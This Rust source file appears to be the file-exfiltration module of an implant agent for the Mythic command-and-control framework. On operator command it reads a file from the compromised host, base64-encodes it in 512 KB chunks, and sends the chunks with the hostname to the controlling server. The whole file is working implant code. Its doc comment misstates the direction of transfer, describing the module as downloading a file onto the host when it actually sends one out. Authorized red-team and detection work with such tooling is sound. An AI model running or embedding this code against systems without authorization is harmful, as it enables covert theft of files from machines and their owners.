use crate::agent::{AgentTask, ContinuedData};
use crate::mythic_success;
use crate::utils::unverbatim;
use serde::Deserialize;
use serde_json::json;
use std::error::Error;
use std::io::Cursor;
use std::path::Path;
use std::result::Result;
use std::sync::mpsc;

use std::io::Read;

/// Chunk size used for chunking and sending files
const CHUNK_SIZE: usize = 512000;

#[cfg(target_os = "windows")]
use crate::utils::windows::whoami::hostname;

#[cfg(target_os = "linux")]
use crate::utils::linux::whoami::hostname;

/// Struct containing the task parameters
#[derive(Deserialize)]
struct DownloadArgs {
    /// File to download
    file: String,
}

/// Downloads a file from Mythic and places it on the host system
/// * `tx` - Channel used for sending information to Mythic
/// * `rx` - Channel used for receiving information from Mythic
pub fn download_file(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    // Grab the inital task information
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;

    // Parse the task parameters
    let args: DownloadArgs = serde_json::from_str(&task.parameters)?;

    // Formulate the absolute path to the file
    let cwd = std::env::current_dir()?;
    let file_path = Path::new(&cwd.join(args.file)).canonicalize()?;

    let full_path = unverbatim(file_path.clone()).to_string_lossy().to_string();

    // Open the file and get the size
    let mut file = std::fs::File::open(&file_path)?;
    let file_len = file.metadata()?.len() as usize;

    // Calculate the total number of chunks which will be sent
    let total_chunks = ((file_len as f64 / CHUNK_SIZE as f64).ceil()) as usize;

    // Send the file information up to Mythic for initiating a file download
    tx.send(json!({
        "total_chunks": total_chunks,
        "task_id": task.id,
        "full_path": full_path,
        "host": hostname().unwrap_or_else(|| "".to_string()),
        "is_screenshot": false,
    }))?;

    // Read in the file data
    let mut file_data: Vec<u8> = Vec::new();
    file.read_to_end(&mut file_data)?;

    // Explicitly close the file handle.
    drop(file);

    // Create a cursor which will traverse the file data
    let mut c = Cursor::new(file_data);

    // Get the response from Mythic containing the file id for tracking
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    let params: ContinuedData = serde_json::from_str(&task.parameters)?;
    let file_id: String = params
        .file_id
        .ok_or_else(|| std::io::Error::new(std::io::ErrorKind::Other, "No file id"))?;

    // Iterate over the file data sending up the chunks
    for num in 0..total_chunks {
        // Create a temporary buffer for the data
        let mut buffer: [u8; CHUNK_SIZE] = [0; CHUNK_SIZE];

        // Read a chunk of file data to the buffer and base64 encode it
        let len = c.read(&mut buffer)?;
        let chunk_data = base64::encode(&buffer[..len]);

        // Send over the response to Mythic
        tx.send(json!({
            "chunk_num": num + 1,
            "file_id": file_id,
            "chunk_data": chunk_data,
            "task_id": task.id,
            "total_chunks": -1,
        }))?;

        // Wait until a message is received from Mythic and continue
        let _: AgentTask = serde_json::from_value(rx.recv()?)?;
    }

    // Formulate the success output for Mythic
    let mut output = mythic_success!(task.id, file_id);

    // Add an artifact signifying that a file was opened
    let output = output.as_object_mut().unwrap();
    output.insert(
        "artifacts".to_string(),
        serde_json::json!(
            [
                {
                    "base_artifact": "FileOpen",
                    "artifact": full_path,
                }
            ]
        ),
    );

    // Send over the completed download message
    tx.send(serde_json::to_value(output)?)?;

    Ok(())
}
